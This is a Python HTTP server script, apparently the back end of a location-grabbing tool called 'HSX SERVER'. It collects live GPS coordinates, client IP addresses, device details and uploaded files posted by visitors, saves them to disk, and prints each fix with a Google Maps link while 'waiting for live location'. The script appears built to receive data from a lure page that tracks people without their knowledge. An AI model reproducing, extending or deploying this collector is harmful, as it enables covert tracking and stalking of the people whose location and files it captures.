import http.server, json, os, base64, datetime, sys, socket

R  = '\033[0m'; B  = '\033[1m'
CY = '\033[1;36m'; GR = '\033[1;32m'; YE = '\033[1;33m'
MG = '\033[1;35m'; RD = '\033[1;31m'

OWNER = "KRISHN"

def parse_port():
    if len(sys.argv) > 1:
        try:
            p = int(sys.argv[1])
            if 1 <= p <= 65535: return p
        except (ValueError, TypeError): pass
    return 8080

PORT = parse_port()
BASE = os.path.dirname(os.path.abspath(__file__))
for d in ("files","location","device"):
    os.makedirs(os.path.join(BASE, d), exist_ok=True)

LOCATION_COUNT = 0
LAST_LAT = None
LAST_LON = None

def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "127.0.0.1"

def print_banner(port):
    lan = get_lan_ip()
    print()
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {B}{GR}HSX SERVER IS RUNNING{R}")
    print(f"{MG}│{R}  {YE}Owner{R}     : {B}{RD}{OWNER}{R}")
    print(f"{MG}│{R}  {YE}Local{R}     : {CY}http://127.0.0.1:{port}{R}")
    print(f"{MG}│{R}  {YE}LAN IP{R}    : {CY}{lan}{R}")
    print(f"{MG}│{R}  {YE}Save{R}      : {CY}{BASE}{R}")
    print(f"{MG}│{R}  {YE}Stop{R}      : {B}{RD}Ctrl+C{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print()
    print(f"{B}{GR}▶ Waiting for live location...{R}")
    print()

def is_same_location(lat, lon):
    global LAST_LAT, LAST_LON
    if LAST_LAT is None: return False
    try:
        return abs(float(lat)-float(LAST_LAT)) < 0.0001 and abs(float(lon)-float(LAST_LON)) < 0.0001
    except Exception:
        return False

def print_location(loc, client_ip=""):
    global LOCATION_COUNT, LAST_LAT, LAST_LON
    lat = loc.get("lat"); lon = loc.get("lon")
    if is_same_location(lat, lon): return
    LAST_LAT = lat; LAST_LON = lon
    LOCATION_COUNT += 1
    acc = loc.get("acc") or 0
    spd = loc.get("spd")
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    link = f"https://www.google.com/maps?q={lat},{lon}"
    try: acc_str = f"±{float(acc):.0f}m"
    except Exception: acc_str = "n/a"
    try: spd_str = f"{float(spd):.1f} m/s" if spd not in (None, 0) else "-"
    except Exception: spd_str = "-"
    print()
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {GR}{B}📍  LIVE LOCATION   #{LOCATION_COUNT}{R}   {YE}{ts}{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {YE}Lat{R}   : {CY}{lat}{R}")
    print(f"{MG}│{R}  {YE}Lon{R}   : {CY}{lon}{R}")
    print(f"{MG}│{R}  {YE}Acc{R}   : {CY}{acc_str}{R}   {YE}Spd{R} : {CY}{spd_str}{R}")
    print(f"{MG}│{R}  {YE}IP{R}    : {CY}{client_ip}{R}")
    print(f"{MG}│{R}  {YE}Map{R}   : {B}{CY}{link}{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print()

def print_device(d):
    print(f"{CY}[device]{R} {YE}{d.get('tz','')}{R} · {YE}{d.get('screen','')}{R}")
    print()

def free_port(start):
    for p in range(start, start+20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", p)); s.close(); return p
        except OSError: continue
    return None

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self,*a,**k): super().__init__(*a,directory=BASE,**k)
    def log_message(self,*a): pass
    def _json(self, obj, code=200):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json")
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Content-Length",str(len(b)))
        self.end_headers(); self.wfile.write(b)
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        self.end_headers()
    def do_POST(self):
        n = int(self.headers.get("Content-Length",0))
        try: body = json.loads(self.rfile.read(n) or b"{}")
        except Exception: return self._json({"ok":False},400)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        if self.path == "/location":
            p = os.path.join(BASE,"location","loc_%s.json" % ts)
            open(p,"w",encoding="utf-8").write(json.dumps(body,ensure_ascii=False,indent=2))
            cip = self.client_address[0] if self.client_address else ""
            print_location(body, cip)
            return self._json({"ok":True})
        if self.path == "/device":
            p = os.path.join(BASE,"device","dev_%s.json" % ts)
            open(p,"w",encoding="utf-8").write(json.dumps(body,ensure_ascii=False,indent=2))
            print_device(body)
            return self._json({"ok":True})
        if self.path == "/upload":
            name = os.path.basename(body.get("name","file"))
            data = base64.b64decode(body.get("data",""))
            if len(data) > 8*1024*1024: return self._json({"ok":False},413)
            p = os.path.join(BASE,"files",name)
            open(p,"wb").write(data)
            print(f"{GR}[+]{R} file saved: {CY}{p}{R}")
            return self._json({"ok":True})
        self._json({"ok":False},404)

fp = free_port(PORT)
if fp is None:
    print(f"{RD}[!]{R} No free port"); sys.exit(2)

httpd = http.server.ThreadingHTTPServer(("127.0.0.1", fp), H)
print_banner(fp)

try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print(f"\n{YE}[*]{R} Stopping server...")
finally:
    httpd.server_close()
